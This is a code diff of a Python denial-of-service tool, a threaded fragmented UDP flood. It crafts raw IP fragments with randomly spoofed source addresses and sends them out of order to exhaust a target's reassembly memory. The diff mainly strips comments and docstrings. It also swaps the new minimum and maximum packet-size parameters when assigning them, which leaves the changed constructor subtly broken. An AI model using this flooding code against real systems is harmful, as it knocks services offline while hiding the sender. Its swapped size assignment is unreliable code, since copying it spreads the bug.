@@ -6,7 +6,6 @@ import random
 import time
 import threading
 
-# Add the current directory to sys.path to handle imports from different execution contexts
 current_dir = os.path.dirname(os.path.abspath(__file__))
 if current_dir not in sys.path:
     sys.path.insert(0, current_dir)
@@ -14,7 +13,6 @@ if current_dir not in sys.path:
 try:
     from attack_strategy import AttackStrategy
 except ImportError:
-    # If direct import fails, try relative import
     from .attack_strategy import AttackStrategy
 
 """
@@ -173,114 +171,67 @@ class FragmentedUDPFlood(AttackStrategy):
     6. Incomplete/delayed fragments waste memory until timeout
     """
 
-    def __init__(self, target_ip, target_port, duration=60, threads=20):
-        """
-        Initialize the Fragmented UDP Flood attack.
-
-        Args:
-            target_ip (str): The IP address of the target server
-            target_port (int): The port number to attack
-            duration (int): Duration of the attack in seconds (default: 60)
-            threads (int): Number of threads to use for the attack (default: 20)
-        """
+    def __init__(self, target_ip, target_port, duration=60, threads=20, min_packet_size=1500, max_packet_size=8000):
         super().__init__(target_ip, target_port, duration, threads)
-        self.fragment_size = 1480  # Maximum fragment payload size (1500 - 20 IP header)
-        self.max_packet_size = 8000  # Maximum original UDP packet size
-        self.min_packet_size = 1500  # Minimum packet size to ensure fragmentation
+        self.fragment_size = 1480
+        self.max_packet_size = min_packet_size
+        self.min_packet_size = max_packet_size
 
     def _create_ip_header(
         self, source_ip, dest_ip, total_length, identification, flags, fragment_offset
     ):
-        """
-        Create an IP header for the fragmented packet.
-
-        Args:
-            source_ip (str): Source IP address (spoofed)
-            dest_ip (str): Destination IP address
-            total_length (int): Total length of IP packet
-            identification (int): Fragment identification number
-            flags (int): IP flags (Don't Fragment, More Fragments)
-            fragment_offset (int): Fragment offset in 8-byte units
-
-        Returns:
-            bytes: Packed IP header
-        """
+        """Create an IP header for the fragmented packet."""
         version = 4
         ihl = 5  # Header length in 32-bit words
-        tos = 0  # Type of service
+        tos = 0
         ttl = 64
         protocol = socket.IPPROTO_UDP
-        check = 0  # Checksum will be calculated by kernel
+        check = 0
         saddr = socket.inet_aton(source_ip)
         daddr = socket.inet_aton(dest_ip)
 
-        # Pack IP header
         ip_header = struct.pack(
             "!BBHHHBBH4s4s",
-            (version << 4) + ihl,  # Version and IHL
-            tos,  # Type of Service
-            total_length,  # Total Length
-            identification,  # Identification
-            flags | fragment_offset,  # Flags and Fragment Offset
-            ttl,  # TTL
-            protocol,  # Protocol
-            check,  # Checksum
-            saddr,  # Source Address
+            (version << 4) + ihl,
+            tos,
+            total_length,
+            identification,
+            flags | fragment_offset,
+            ttl,
+            protocol,
+            check,
+            saddr,
             daddr,
-        )  # Destination Address
+        )
 
         return ip_header
 
     def _create_udp_header(self, source_port, dest_port, udp_length):
-        """
-        Create a UDP header.
-
-        Args:
-            source_port (int): Source port number
-            dest_port (int): Destination port number
-            udp_length (int): UDP packet length (header + data)
-
-        Returns:
-            bytes: Packed UDP header
-        """
-        checksum = 0  # Will be calculated later
+        """Create a UDP header."""
+        checksum = 0
 
         udp_header = struct.pack(
             "!HHHH",
-            source_port,  # Source Port
-            dest_port,  # Destination Port
-            udp_length,  # Length
+            source_port,
+            dest_port,
+            udp_length,
             checksum,
-        )  # Checksum
+        )
 
         return udp_header
 
     def _calculate_udp_checksum(self, source_ip, dest_ip, udp_header, udp_data):
-        """
-        Calculate UDP checksum using pseudo-header.
-
-        Args:
-            source_ip (str): Source IP address
-            dest_ip (str): Destination IP address
-            udp_header (bytes): UDP header
-            udp_data (bytes): UDP payload data
-
-        Returns:
-            int: Calculated checksum
-        """
-        # Create pseudo-header
+        """Calculate UDP checksum using pseudo-header."""
         pseudo_header = struct.pack(
             "!4s4sBBH",
-            socket.inet_aton(source_ip),  # Source Address
-            socket.inet_aton(dest_ip),  # Destination Address
-            0,  # Zero
-            socket.IPPROTO_UDP,  # Protocol
+            socket.inet_aton(source_ip),
+            socket.inet_aton(dest_ip),
+            0,
+            socket.IPPROTO_UDP,
             len(udp_header) + len(udp_data),
-        )  # UDP Length
+        )
 
-        # Combine pseudo-header, UDP header, and data
         checksum_data = pseudo_header + udp_header + udp_data
-
         return self.checksum(checksum_data)
 
     def _create_fragment(
@@ -294,23 +245,7 @@ class FragmentedUDPFlood(AttackStrategy):
         fragment_offset,
         more_fragments,
     ):
-        """
-        Create a single IP fragment containing UDP data.
-
-        Args:
-            source_ip (str): Source IP address
-            dest_ip (str): Destination IP address
-            source_port (int): Source port number
-            dest_port (int): Destination port number
-            identification (int): Fragment identification
-            fragment_data (bytes): Fragment payload data
-            fragment_offset (int): Fragment offset in bytes
-            more_fragments (bool): Whether more fragments follow
-
-        Returns:
-            bytes: Complete IP fragment packet
-        """
-        # Calculate fragment offset in 8-byte units
+        """Create a single IP fragment containing UDP data."""
         offset_units = fragment_offset // 8
 
         # Set flags
@@ -318,18 +253,15 @@ class FragmentedUDPFlood(AttackStrategy):
         if more_fragments:
             flags |= 0x2000  # More Fragments = 1
 
-        # For first fragment, include UDP header
         if fragment_offset == 0:
             # Create UDP header (only in first fragment)
-            udp_length = 8 + len(fragment_data)  # This is just for the fragment
+            udp_length = 8 + len(fragment_data)
             udp_header = self._create_udp_header(source_port, dest_port, udp_length)
 
-            # Calculate UDP checksum (simplified for fragmented packets)
             udp_checksum = self._calculate_udp_checksum(
                 source_ip, dest_ip, udp_header, fragment_data
             )
 
-            # Update UDP header with correct checksum
             udp_header = struct.pack(
                 "!HHHH", source_port, dest_port, udp_length, udp_checksum
             )
@@ -339,39 +271,19 @@ class FragmentedUDPFlood(AttackStrategy):
             # Subsequent fragments contain only data
             fragment_payload = fragment_data
 
-        # Calculate total length
-        total_length = 20 + len(fragment_payload)  # IP header + payload
+        total_length = 20 + len(fragment_payload)
 
-        # Create IP header
         ip_header = self._create_ip_header(
             source_ip, dest_ip, total_length, identification, flags, offset_units
         )
 
-        # Combine IP header and payload
         packet = ip_header + fragment_payload
-
         return packet
 
     def _create_fragmented_udp_packet(self, source_ip, dest_ip, source_port, dest_port):
-        """
-        Create a large UDP packet and fragment it.
-
-        Args:
-            source_ip (str): Source IP address
-            dest_ip (str): Destination IP address
-            source_port (int): Source port number
-            dest_port (int): Destination port number
-
-        Returns:
-            list: List of fragment packets
-        """
-        # Generate random payload size
+        """Create a large UDP packet and fragment it."""
         payload_size = random.randint(self.min_packet_size, self.max_packet_size)
-
-        # Create random payload data
         payload_data = bytes([random.randint(0, 255) for _ in range(payload_size)])
-
-        # Generate unique identification for this packet
         identification = random.randint(1, 65535)
 
         fragments = []
@@ -381,7 +293,6 @@ class FragmentedUDPFlood(AttackStrategy):
         first_fragment_data_size = self.fragment_size - 8  # Account for UDP header
         first_fragment_data = payload_data[:first_fragment_data_size]
 
-        # Create first fragment
         more_fragments = len(payload_data) > first_fragment_data_size
         first_fragment = self._create_fragment(
             source_ip,
@@ -395,8 +306,7 @@ class FragmentedUDPFlood(AttackStrategy):
         )
         fragments.append(first_fragment)
 
-        # Update offset and remaining data
-        fragment_offset += 8 + len(first_fragment_data)  # UDP header + data
+        fragment_offset += 8 + len(first_fragment_data)
         remaining_data = payload_data[first_fragment_data_size:]
 
         # Create subsequent fragments
@@ -426,24 +336,13 @@ class FragmentedUDPFlood(AttackStrategy):
         return fragments
 
     def _send_fragments(self, fragments, dest_ip):
-        """
-        Send fragments to the target, potentially out of order.
-
-        Args:
-            fragments (list): List of fragment packets
-            dest_ip (str): Destination IP address
-
-        Returns:
-            int: Number of fragments successfully sent
-        """
+        """Send fragments to the target, potentially out of order."""
         sent_count = 0
 
         try:
-            # Create raw socket
             sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
             sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
 
-            # Shuffle fragments to send out of order (increases processing overhead)
             fragment_order = list(range(len(fragments)))
             random.shuffle(fragment_order)
 
@@ -451,8 +350,6 @@ class FragmentedUDPFlood(AttackStrategy):
                 try:
                     sock.sendto(fragments[i], (dest_ip, 0))
                     sent_count += 1
-
-                    # Small delay between fragments
                     time.sleep(0.001)
 
                 except Exception as e:
@@ -492,8 +389,6 @@ class FragmentedUDPFlood(AttackStrategy):
 
         while self.attack_active:
             try:
-                # IP SPOOFING: Generate random spoofed source IP address
-                # This makes packets appear to come from different hosts
                 source_ip = self.generate_random_ip()
                 source_port = random.randint(1024, 65535)
 
@@ -501,12 +396,10 @@ class FragmentedUDPFlood(AttackStrategy):
                     f"Thread {thread_id}: Spoofing source IP {source_ip}:{source_port}"
                 )
 
-                # Create fragmented UDP packet with spoofed source
                 fragments = self._create_fragmented_udp_packet(
                     source_ip, self.target_ip, source_port, self.target_port
                 )
 
-                # Send fragments out of order to maximize processing overhead
                 sent_count = self._send_fragments(fragments, self.target_ip)
 
                 if sent_count > 0:
@@ -515,7 +408,6 @@ class FragmentedUDPFlood(AttackStrategy):
                         f"Sent {sent_count} fragments from spoofed {source_ip}:{source_port}"
                     )
 
-                # Delay between packet generations
                 time.sleep(0.05)
 
             except Exception as e:
@@ -532,13 +424,11 @@ class FragmentedUDPFlood(AttackStrategy):
                 elapsed = time.time() - start_time
                 rate = self.packets_sent / elapsed if elapsed > 0 else 0
 
-                # Get color-coded rate display
                 rate_color = self._get_rate_color(rate)
 
                 progress_msg = f"Elapsed: {elapsed:.1f}s | Fragments: {self.packets_sent} | Rate: {rate:.1f} fps"
                 self._print_colored(f"\r{progress_msg}", rate_color, end="")
 
-                # Log progress every 10 seconds
                 if int(elapsed) % 10 == 0 and int(elapsed) > 0:
                     self.logger.info(f"UDP Fragment attack progress - {progress_msg}")
 
@@ -548,10 +438,7 @@ class FragmentedUDPFlood(AttackStrategy):
             self.logger.warning("UDP Fragment attack interrupted by user")
 
     def attack(self):
-        """
-        Execute the Fragmented UDP Flood attack with IP spoofing.
-        """
-        # Display attack header
+        """Execute the Fragmented UDP Flood attack with IP spoofing."""
         self._display_attack_header()
 
         self.logger.info(
@@ -567,11 +454,9 @@ class FragmentedUDPFlood(AttackStrategy):
             "IP SPOOFING ENABLED: Using random source IP addresses for each packet"
         )
 
-        # Check privileges
         if not self._check_privileges():
             return
 
-        # Start the attack
         self.attack_active = True
         start_time = time.time()
 
@@ -588,30 +473,23 @@ class FragmentedUDPFlood(AttackStrategy):
             f"Starting {self.threads} UDP fragment worker threads with IP spoofing"
         )
 
-        # Create and start worker threads
         threads = self._start_worker_threads()
 
         self._print_success(f"✓ {self.threads} UDP fragment worker threads started")
         self._print_info("Fragmented UDP attack in progress... Press Ctrl+C to stop")
 
-        # Monitor attack progress
         self._monitor_attack_progress(start_time)
 
-        # Stop the attack
         self.attack_active = False
         self._print_info("\nStopping UDP fragment attack threads...")
 
-        # Wait for threads to finish
         for thread in threads:
             thread.join(timeout=1)
 
-        # Display final results
         self._display_attack_completion(start_time)
 
 
-# Example usage for testing
 if __name__ == "__main__":
-    # Setup basic logging for standalone usage
     import logging
 
     logging.basicConfig(
@@ -621,8 +499,5 @@ if __name__ == "__main__":
     target_ip = "127.0.0.1"  # Localhost for testing
     target_port = 53  # DNS port
 
-    # Create attack instance with reduced parameters for testing
     attack = FragmentedUDPFlood(target_ip, target_port, duration=5, threads=3)
-
-    # Execute the attack
     attack.attack()
